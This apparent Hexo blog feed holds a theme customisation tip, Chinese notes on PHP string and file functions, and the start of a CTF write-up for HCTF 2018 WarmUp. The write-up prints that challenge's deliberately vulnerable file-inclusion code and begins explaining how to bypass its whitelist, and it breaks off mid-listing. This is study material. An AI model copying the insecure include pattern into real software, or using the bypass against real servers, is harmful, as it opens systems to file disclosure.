        <content type="html"><![CDATA[<h1 id="更改公告内容-gif图片"><a href="#更改公告内容-gif图片" class="headerlink" title="更改公告内容+gif图片"></a>更改公告内容+gif图片</h1><p>在主题配置文件中搜索 card_announcement </p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">This</span> <span class="string">is</span> <span class="string">my</span> <span class="string">Blog</span> <span class="string">//公告内容</span></span><br></pre></td></tr></table></figure><p>更改后</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">欢迎来到yui1111的博客！&lt;img</span> <span class="string">src=&quot;https://cdn.jsdelivr.net/gh/rigodlee/BLOGCDN/img/20150404H5648_ZuzhL.gif&quot;</span></span><br></pre></td></tr></table></figure><p>效果如下：</p><p><a href="https://imgtu.com/i/603iAU"><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/03/14/603iAU.png" alt="603iAU.png"></a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP常看到的函数</title>
      <link href="2021/03/14/PHP%E5%87%BD%E6%95%B0/"/>
      <url>2021/03/14/PHP%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="php-mb-strpos-函数"><a href="#php-mb-strpos-函数" class="headerlink" title="php mb_strpos()函数"></a>php mb_strpos()函数</h1><p>mb_strpos(): 返回要查找的字符串在另一个字符串中首次出现的位置</p><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mb_strpos (haystack,needle)</span><br></pre></td></tr></table></figure><p>参数：</p><p>haystack：要被检查的字符串</p><p>needle：要收缩的字符串</p><h2 id="例：php查找字符串在另一个字符串中首次出现的位置"><a href="#例：php查找字符串在另一个字符串中首次出现的位置" class="headerlink" title="例：php查找字符串在另一个字符串中首次出现的位置"></a>例：php查找字符串在另一个字符串中首次出现的位置</h2><p>代码1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;http://www.feiniaomy.com&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> mb_strpos(<span class="variable">$str</span>,<span class="string">&#x27;niao&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：14</p><p>注意：mb_strpos()函数返回被查找的字符串在别一字符串中首次出现的位置</p><p>代码2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content–type:text/html;chartset=utf-8&quot;</span>); </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;飞鸟慕鱼博客&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> mb_strpos(<span class="variable">$str</span>,<span class="string">&#x27;慕鱼&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出结果：2</p><p>代码3：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&quot;Content–type:text/html;chartset=utf-8&quot;</span>); </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;飞鸟慕鱼博客&#x27;</span>;</span><br><span class="line">var_dump(mb_strpos(<span class="variable">$str</span>,<span class="string">&#x27;墨初&#x27;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>打印结果：bool(false)</p><p>注：如果要查找的字符串不存在，则会返回 false </p><h2 id="mb-strpos-函数总结："><a href="#mb-strpos-函数总结：" class="headerlink" title="mb_strpos()函数总结："></a>mb_strpos()函数总结：</h2><ol><li>mb_strpos()函数是基于字符数进行查出返回的，第一个字符的位置是0，第二个字符的位置是1，以次类推。</li><li>mb_strpos()函数返回查找到字符串的首次出现的位置，如果不存在则返回 false</li><li>使用mb_strpos()函数对中文字符进行操作时，尽量要对页面的编码类型进行声明一下</li></ol><h1 id="PHP-strstr-函数"><a href="#PHP-strstr-函数" class="headerlink" title="PHP strstr()函数"></a>PHP strstr()函数</h1><p>strstr() 函数搜索字符串在另一字符串中是否存在，如果是，返回该字符串及剩余部分，否则返回 FALSE。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数是区分大小写的。如需进行不区分大小写的搜索，请使用 <a href="https://www.runoob.com/php/func-string-stristr.html">stristr()</a> 函数。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> strstr(<span class="string">&quot;Hello world!&quot;</span>,<span class="string">&quot;world&quot;</span>);  <span class="comment">// 输出 world!</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回 <code>world</code> </p><h1 id="PHP-str-replace-函数"><a href="#PHP-str-replace-函数" class="headerlink" title="PHP str_replace()函数"></a>PHP str_replace()函数</h1><h2 id="定义和用法"><a href="#定义和用法" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>str_replace() 函数替换字符串中的一些字符（区分大小写）。</p><p>该函数必须遵循下列规则：</p><ul><li>如果搜索的字符串是一个数组，那么它将返回一个数组。</li><li>如果搜索的字符串是一个数组，那么它将对数组中的每个元素进行查找和替换。</li><li>如果同时需要对某个数组进行查找和替换，并且需要执行替换的元素少于查找到的元素的数量，那么多余的元素将用空字符串进行替换。</li><li>如果是对一个数组进行查找，但只对一个字符串进行替换，那么替代字符串将对所有查找到的值起作用。</li></ul><p><strong>注释：</strong>该函数是区分大小写的。请使用 <a href="https://www.runoob.com/php/func-string-str-ireplace.html">str_ireplace()</a> 函数执行不区分大小写的搜索。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> str_replace(<span class="string">&quot;world&quot;</span>,<span class="string">&quot;Peter&quot;</span>,<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>返回 <code>Hello Peter</code> </p><h1 id="PHP-eval-函数"><a href="#PHP-eval-函数" class="headerlink" title="PHP eval()函数"></a>PHP eval()函数</h1><h2 id="定义和用法-1"><a href="#定义和用法-1" class="headerlink" title="定义和用法"></a>定义和用法</h2><p><strong>eval() 函数把字符串按照 PHP 代码来计算。</strong></p><p>该字符串必须是合法的 PHP 代码，且必须以分号结尾。</p><p><strong>注释：</strong>return 语句会立即终止对字符串的计算。</p><p><strong>提示：</strong>该函数对于在数据库文本字段中供日后计算而进行的代码存储很有用。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$string</span> = <span class="string">&quot;beautiful&quot;</span>;</span><br><span class="line"><span class="variable">$time</span> = <span class="string">&quot;winter&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;This is a $string $time morning!&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>. PHP_EOL;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&quot;\$str = \&quot;<span class="subst">$str</span>\&quot;;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为: 第一行： <code>This is a $string $time morning!</code> </p><p>第二行： <code>This is a beautiful winter morning!</code></p><h1 id="PHP-preg-match-all-函数"><a href="#PHP-preg-match-all-函数" class="headerlink" title="PHP preg_match_all() 函数"></a>PHP preg_match_all() 函数</h1><p>preg_match_all 函数用于执行一个全局正则表达式匹配。</p><p>搜索 subject 中所有匹配 pattern 给定正则表达式的匹配结果并且将它们以 flag 指定顺序输出到 matches 中。</p><p>在第一个匹配找到后, 子序列继续从最后一次匹配位置搜索。</p><p>参数说明：</p><ul><li>$pattern: 要搜索的模式，字符串形式。</li><li>$subject: 输入字符串。</li><li>$matches: 多维数组，作为输出参数输出所有匹配结果, 数组排序通过flags指定。</li><li>$flags：可以结合下面标记使用(注意不能同时使用PREG_PATTERN_ORDER和 PREG_SET_ORDER)：<ol><li>PREG_PATTERN_ORDER: 结果排序为$matches[0]保存完整模式的所有匹配, $matches[1] 保存第一个子组的所有匹配，以此类推。</li><li>PREG_SET_ORDER: 结果排序为$matches[0]包含第一次匹配得到的所有匹配(包含子组)， $matches[1]是包含第二次匹配到的所有匹配(包含子组)的数组，以此类推。</li><li>PREG_OFFSET_CAPTURE: 如果这个标记被传递，每个发现的匹配返回时会增加它相对目标字符串的偏移量。</li></ol></li><li>offset: 通常， 查找时从目标字符串的开始位置开始。可选参数offset用于 从目标字符串中指定位置开始搜索(单位是字节)。</li></ul><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$userinfo</span> = <span class="string">&quot;Name: &lt;b&gt;PHP&lt;/b&gt; &lt;br&gt; Title: &lt;b&gt;Programming Language&lt;/b&gt;&quot;</span>;</span><br><span class="line">preg_match_all (<span class="string">&quot;/&lt;b&gt;(.*)&lt;\/b&gt;/U&quot;</span>, <span class="variable">$userinfo</span>, <span class="variable">$pat_array</span>);</span><br><span class="line">print_r(<span class="variable">$pat_array</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; &lt;b&gt;PHP&lt;/b&gt;</span><br><span class="line">    [<span class="number">1</span>] =&gt; &lt;b&gt;Programming Language&lt;/b&gt;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h1 id="PHP-file-get-contents-函数"><a href="#PHP-file-get-contents-函数" class="headerlink" title="PHP file_get_contents() 函数"></a>PHP file_get_contents() 函数</h1><p>file_get_contents() 把整个文件读入一个字符串中。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">This is a test file with test text.</span><br></pre></td></tr></table></figure><h1 id="PHP-scandir-函数"><a href="#PHP-scandir-函数" class="headerlink" title="PHP scandir() 函数"></a>PHP scandir() 函数</h1><p>scandir() 函数返回指定目录中的文件和目录的数组。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(scandir(/绘画));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>将会返回<code>绘画</code>目录中的文件和目录</p><h1 id="PHP-var-dump-函数"><a href="#PHP-var-dump-函数" class="headerlink" title="PHP var_dump() 函数"></a>PHP var_dump() 函数</h1><p><strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p><strong>var_dump()</strong> 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="number">1</span>, <span class="number">2</span>, <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>));</span><br><span class="line">var_dump(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">2</span>)</span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  <span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">    [<span class="number">0</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;a&quot;</span></span><br><span class="line">    [<span class="number">1</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;b&quot;</span></span><br><span class="line">    [<span class="number">2</span>]=&gt;</span><br><span class="line">    <span class="keyword">string</span>(<span class="number">1</span>) <span class="string">&quot;c&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如 <strong>[RoarCTF 2019]Easy Calc</strong> 中的题目使用 <code>var_dump</code>函数将里面的文件显示出来</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/23/9PDiKqMpfgGX4bR.png" alt="image-20210323100855070"></p><p>从而发现<code>f1agg</code>文件夹，再利用<code>file_get_contents</code>函数进入<code>f1agg</code>中</p><h1 id="PHP-ctype-alpha-函数"><a href="#PHP-ctype-alpha-函数" class="headerlink" title="PHP ctype_alpha()函数"></a>PHP ctype_alpha()函数</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctype_alpha ( <span class="keyword">string</span> `<span class="variable">$text</span>` ) : <span class="keyword">bool</span></span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p><code>text</code></p><p>被测试的字符串。</p><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>如果在当前语言环境中 <code>text</code> 里的每个字符都是一个字母，那么就返回**<code>true</code><strong>，反之则返回</strong><code>false</code>**。</p><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;d123kk&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(ctype_alpha(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// echo 0</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;dkk&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(ctype_alpha(<span class="variable">$a</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;0&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// echo 1</span></span><br></pre></td></tr></table></figure><h1 id="PHP-intval-函数"><a href="#PHP-intval-函数" class="headerlink" title="PHP intval()函数"></a>PHP intval()函数</h1><h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> intval ( mixed <span class="variable">$var</span> [, <span class="keyword">int</span> <span class="variable">$base</span> = <span class="number">10</span> ] )</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>$var：要转换成 integer 的数量值。</li><li>$base：转化所使用的进制。</li></ul><p>如果 base 是 0，通过检测 var 的格式来决定使用的进制：</p><ul><li>如果字符串包括了 “0x” (或 “0X”) 的前缀，使用 16 进制 (hex)；否则，</li><li>如果字符串以 “0” 开始，使用 8 进制(octal)；否则，</li><li>将使用 10 进制 (decimal)。</li></ul><h3 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h3><p>成功时返回 var 的 integer 值，失败时返回 0。 空的 array 返回 0，非空的 array 返回 1。</p><p>最大的值取决于操作系统。 32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p><p>字符串有可能返回 0，虽然取决于字符串最左侧的字符。</p><h1 id="PHP-strpos-函数"><a href="#PHP-strpos-函数" class="headerlink" title="PHP strpos() 函数"></a>PHP strpos() 函数</h1><h2 id="定义和用法-2"><a href="#定义和用法-2" class="headerlink" title="定义和用法"></a>定义和用法</h2><p>strpos() f函数查找字符串在另一字符串中第一次出现的位置（区分大小写）。</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> strpos(<span class="string">&quot;amd,yes;&quot;</span>,<span class="string">&quot;yes&quot;</span>).<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(strpos(<span class="string">&quot;amd,yes;&quot;</span>,<span class="string">&quot;yes&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------*/</span></span><br><span class="line">输出：<span class="number">4</span></span><br><span class="line">    <span class="keyword">int</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p><strong>注释：</strong>strpos() 函数是区分大小写的。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>当使用<code>！strpos(&quot;...&quot;,&quot;...&quot;);</code>时，返回值不一定为<code>int</code>类型</p><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump(strpos(<span class="string">&quot;123203&quot;</span>,<span class="string">&quot;0&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(!strpos(<span class="string">&quot;2103&quot;</span>,<span class="string">&quot;0&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">var_dump(!strpos(<span class="string">&quot;01112&quot;</span>,<span class="string">&quot;0&quot;</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">/*--------------------------------------------------------------------------------------*/</span></span><br><span class="line">输出：<span class="keyword">int</span>(<span class="number">4</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">true</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 自己看的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU web</title>
      <link href="2021/03/13/BUU%20WEB/"/>
      <url>2021/03/13/BUU%20WEB/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><p>打开靶机后进入，除了看到一个滑稽没有别的东西，查看源代码发现有提示 —— <code>&lt;!--source.php--&gt;</code></p><p><a href="https://imgtu.com/i/6doLh8"><img src= "/img/loading.gif" data-lazy-src="https://s3.ax1x.com/2021/03/13/6doLh8.md.png" alt="6doLh8.md.png"></a></p><p>直接在链接后加上<code>/source.php</code>后进入，页面出现代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !is_string(<span class="variable">$page</span>)) &#123;<span class="comment">//is_string() 函数用于检测变量是否是字符串</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;<span class="comment">//in_array() 函数搜索数组中是否存在指定的值</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)<span class="comment">//mb_strpos — 查找字符串在另一个字符串中首次出现的位置</span></span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//empty() 函数用于检查一个变量是否为空。</span></span><br><span class="line">        &amp;&amp; is_string(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])<span class="comment">//is_string() 函数用于检测变量是否是字符串。</span></span><br><span class="line">        &amp;&amp; emmm::checkFile(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>看到第7行有一个hint.php尝试进入后，网页上出现    <code>flag not here, and flag in ffffllllaaaagggg</code> 发现flag在ffffllllaaaagggg 中(只要不骗我的话)。</p><p>现在最关键的是如何通过 <strong>checkfile</strong> 函数。观察  <strong>checkFile</strong> 函数，几个if语句并列，只要我们满足其中一个<code>true</code>,即有返回值，便不需要往下继续执行了</p><p>回到 <strong>checkFile</strong> 函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span 